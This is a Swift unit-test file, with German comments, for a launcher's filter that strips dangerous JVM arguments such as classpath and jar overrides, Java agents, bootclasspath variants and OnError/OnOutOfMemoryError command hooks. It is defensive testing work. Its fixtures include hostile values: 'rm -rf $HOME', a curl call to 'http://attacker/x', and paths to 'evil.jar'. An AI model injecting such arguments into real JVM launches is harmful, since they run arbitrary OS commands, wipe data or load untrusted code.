import XCTest
import Foundation

@testable import TradeERPLauncherLib

/// Reine Logik aus `LaunchCoordinator.stripCommandLineHijackingArguments` — wir prüfen, dass der Launcher
/// keine Broker-JVM-Argumente durchlässt, die seine eigene `-cp`/`-jar`/`MainClass`-Reihenfolge brechen
/// oder beim JVM-Fehler beliebige OS-Befehle ausführen würden.
final class LaunchCoordinatorJvmArgsFilterTests: XCTestCase {
    private func runStrip(_ args: [String]) -> (kept: [String], log: String) {
        var v = args
        var captured = ""
        LaunchCoordinator.stripCommandLineHijackingArguments(&v) { captured += $0 }
        return (v, captured)
    }

    func testKeepsHarmlessSystemProperties() {
        let (out, log) = runStrip(["-Dfoo=bar", "-Xmx512m", "-Dbaz=42"])
        XCTAssertEqual(out, ["-Dfoo=bar", "-Xmx512m", "-Dbaz=42"])
        XCTAssertTrue(log.isEmpty)
    }

    func testStripsClasspathPair() {
        let (out, log) = runStrip(["-Dfoo=1", "-cp", "evil.jar", "-Dbar=2"])
        XCTAssertEqual(out, ["-Dfoo=1", "-Dbar=2"])
        XCTAssertTrue(log.contains("-cp"))
        XCTAssertTrue(log.contains("evil.jar"))
    }

    func testStripsClasspathLongFormPair() {
        let (out, _) = runStrip(["-classpath", "evil.jar", "-Dfoo=1"])
        XCTAssertEqual(out, ["-Dfoo=1"])
    }

    func testStripsJarPair() {
        let (out, _) = runStrip(["-jar", "evil.jar", "-Dfoo=1"])
        XCTAssertEqual(out, ["-Dfoo=1"])
    }

    func testTrailingClasspathWithoutValueIsRemoved() {
        let (out, log) = runStrip(["-Dfoo=1", "-cp"])
        XCTAssertEqual(out, ["-Dfoo=1"])
        XCTAssertTrue(log.contains("-cp"))
    }

    func testStripsJavaAgentVariants() {
        let (out, log) = runStrip([
            "-javaagent:/tmp/evil.jar",
            "-agentlib:jdwp=transport=dt_socket",
            "-agentpath:/tmp/lib.dylib",
            "-Dfoo=1",
        ])
        XCTAssertEqual(out, ["-Dfoo=1"])
        XCTAssertTrue(log.contains("-javaagent"))
        XCTAssertTrue(log.contains("-agentlib"))
        XCTAssertTrue(log.contains("-agentpath"))
    }

    /// `-XX:OnError=` erlaubt OS-Befehlsausführung beim JVM-Fehler — muss strikt gefiltert werden.
    func testStripsXXOnErrorCommand() {
        let (out, log) = runStrip([
            "-Xmx256m",
            "-XX:OnError=\"open -a Calculator\"",
            "-Dfoo=ok",
        ])
        XCTAssertEqual(out, ["-Xmx256m", "-Dfoo=ok"])
        XCTAssertTrue(log.contains("-XX:OnError="))
    }

    func testStripsXXOnOutOfMemoryErrorCommand() {
        let (out, log) = runStrip([
            "-XX:OnOutOfMemoryError=rm -rf $HOME",
            "-Dfoo=1",
        ])
        XCTAssertEqual(out, ["-Dfoo=1"])
        XCTAssertTrue(log.contains("-XX:OnOutOfMemoryError="))
    }

    func testStripsXXOnUnhandledExceptionCommand() {
        let (out, _) = runStrip([
            "-XX:OnUnhandledException=/usr/bin/curl http://attacker/x",
        ])
        XCTAssertEqual(out, [])
    }

    /// Boot-Classpath in allen drei Varianten verhindert das Ersetzen von Plattformklassen.
    func testStripsBootclasspathVariants() {
        let (out, log) = runStrip([
            "-Xbootclasspath:/etc/passwd",
            "-Xbootclasspath/a:/tmp/append.jar",
            "-Xbootclasspath/p:/tmp/prepend.jar",
            "-Xmx128m",
        ])
        XCTAssertEqual(out, ["-Xmx128m"])
        XCTAssertTrue(log.contains("-Xbootclasspath:"))
        XCTAssertTrue(log.contains("-Xbootclasspath/a:"))
        XCTAssertTrue(log.contains("-Xbootclasspath/p:"))
    }

    /// Mehrfachvorkommen, gemischte Reihenfolge — alle gefährlichen Tokens müssen weg, der Rest unverändert bleiben.
    func testStripsMixedDangerousAndKeepsOrder() {
        let (out, _) = runStrip([
            "-Dapple.laf.useScreenMenuBar=true",
            "-cp",
            "/tmp/x.jar",
            "-XX:OnError=hax",
            "-Xmx512m",
            "-javaagent:/tmp/agent.jar",
            "-Dapple.awt.application.appearance=system",
        ])
        XCTAssertEqual(out, [
            "-Dapple.laf.useScreenMenuBar=true",
            "-Xmx512m",
            "-Dapple.awt.application.appearance=system",
        ])
    }

    /// Token mit umgebenden Whitespaces (kommt aus serverseitig zusammengesetzten JSON-Strings vor) muss
    /// trotzdem erkannt werden — die Funktion trimt Whitespace pro Token.
    func testTrimsWhitespaceWhenMatching() {
        let (out, _) = runStrip(["  -cp  ", "evil.jar", "  -XX:OnError=hax  ", "-Dfoo=1"])
        XCTAssertEqual(out, ["-Dfoo=1"])
    }
}
